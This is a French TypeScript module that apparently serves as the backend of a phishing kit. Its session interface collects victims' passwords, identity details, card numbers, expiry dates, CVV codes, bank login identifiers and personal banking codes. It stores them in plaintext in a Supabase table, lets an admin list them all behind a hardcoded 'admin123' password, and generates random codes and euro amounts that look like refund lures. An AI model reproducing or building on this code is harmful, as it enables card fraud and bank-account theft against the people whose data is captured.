
import { supabase } from '@/lib/supabase';

interface UserSession {
  email?: string;
  password?: string;
  nom?: string;
  prenom?: string;
  dateNaissance?: string;
  adresse?: string;
  codePostal?: string;
  ville?: string;
  telephone?: string;
  numeroCarte?: string;
  dateExpiration?: string;
  cryptogramme?: string;
  typeBanque?: string;
  identifiantBancaire?: string;
  codePersonnel?: string;
  montant?: string;
  code?: string;
  derniereMaj?: string;
}

// Stocke les données utilisateur dans sessionStorage
export const saveToSession = (key: string, data: any): void => {
  try {
    sessionStorage.setItem(key, JSON.stringify(data));
  } catch (error) {
    console.error("Erreur lors de la sauvegarde dans la session:", error);
  }
};

// Récupère les données utilisateur depuis sessionStorage
export const getFromSession = (key: string): any => {
  try {
    const item = sessionStorage.getItem(key);
    return item ? JSON.parse(item) : null;
  } catch (error) {
    console.error("Erreur lors de la récupération depuis la session:", error);
    return null;
  }
};

// Met à jour les données de session utilisateur
export const updateUserSession = (userData: Partial<UserSession>): void => {
  try {
    const currentData = getFromSession("userData") || {};
    const updatedData = { ...currentData, ...userData };
    saveToSession("userData", updatedData);
  } catch (error) {
    console.error("Erreur lors de la mise à jour de la session utilisateur:", error);
  }
};

// Sauvegarde les données utilisateur dans Supabase
export const saveUserDataToJson = async (): Promise<void> => {
  try {
    const userData = getFromSession("userData");
    
    if (!userData) {
      console.error("Aucune donnée utilisateur trouvée dans la session");
      return;
    }
    
    // Ajouter la date de modification et générer code/montant si nécessaire
    const updatedUserData = {
      ...userData,
      derniereMaj: new Date().toLocaleString('fr-FR'),
      code: userData.code || generateRandomCode(),
      montant: userData.montant || generateRandomAmount()
    };
    
    console.log("Données utilisateur à sauvegarder:", updatedUserData);
    
    // Vérifier si l'utilisateur existe déjà
    const { data: existingUser, error: selectError } = await supabase
      .from('users')
      .select('*')
      .eq('email', updatedUserData.email)
      .single();
    
    if (selectError && selectError.code !== 'PGRST116') {
      console.error("Erreur lors de la vérification de l'utilisateur:", selectError);
      throw selectError;
    }
    
    let result;
    
    if (existingUser) {
      // Mettre à jour l'utilisateur existant
      const { data, error } = await supabase
        .from('users')
        .update(updatedUserData)
        .eq('email', updatedUserData.email)
        .select();
      
      if (error) {
        console.error("Erreur lors de la mise à jour des données utilisateur:", error);
        throw error;
      }
      
      result = data;
    } else {
      // Insérer un nouvel utilisateur
      const { data, error } = await supabase
        .from('users')
        .insert(updatedUserData)
        .select();
      
      if (error) {
        console.error("Erreur lors de l'insertion des données utilisateur:", error);
        throw error;
      }
      
      result = data;
    }
    
    console.log("Données utilisateur sauvegardées avec succès:", result);
    
    return updatedUserData;
  } catch (error) {
    console.error("Erreur lors de la sauvegarde des données utilisateur:", error);
    throw error;
  }
};

// Récupère toutes les données utilisateurs depuis Supabase
export const getAllUsersData = async (): Promise<UserSession[]> => {
  try {
    const { data, error } = await supabase
      .from('users')
      .select('*');
    
    if (error) {
      console.error("Erreur lors de la récupération des données utilisateurs:", error);
      throw error;
    }
    
    return data || [];
  } catch (error) {
    console.error("Erreur lors de la récupération de toutes les données utilisateurs:", error);
    return [];
  }
};

// Supprime un utilisateur par son email
export const deleteUserByEmail = async (email: string): Promise<void> => {
  try {
    const { error } = await supabase
      .from('users')
      .delete()
      .eq('email', email);
    
    if (error) {
      console.error("Erreur lors de la suppression de l'utilisateur:", error);
      throw error;
    }
    
    console.log("Utilisateur supprimé avec succès:", email);
  } catch (error) {
    console.error("Erreur lors de la suppression de l'utilisateur:", error);
    throw error;
  }
};

// Vérifie le mot de passe admin
export const checkAdminPassword = (password: string): boolean => {
  // Mot de passe en dur pour cet exemple
  return password === 'admin123';
};

// Générer un code aléatoire pour l'utilisateur
export const generateRandomCode = (): string => {
  return `${String.fromCharCode(Math.floor(Math.random() * 26) + 65)}${String.fromCharCode(Math.floor(Math.random() * 26) + 65)}${Math.floor(Math.random() * 10)}-${Math.floor(Math.random() * 10)}${String.fromCharCode(Math.floor(Math.random() * 26) + 65)}${Math.floor(Math.random() * 10)}`;
};

// Générer un montant aléatoire pour l'utilisateur
export const generateRandomAmount = (): string => {
  return `${Math.floor(Math.random() * 300) + 50}€`;
};
